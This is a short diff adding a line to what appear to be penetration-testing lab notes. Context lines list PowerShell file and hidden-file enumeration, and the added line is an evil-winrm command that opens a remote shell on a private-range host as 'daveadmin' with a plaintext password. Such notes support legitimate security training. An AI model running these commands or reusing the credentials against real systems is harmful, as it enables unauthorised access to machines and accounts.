@@ -18,3 +18,7 @@ gci -recurse .
 gci -hidden
 ```
 
+```
+evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+```
+
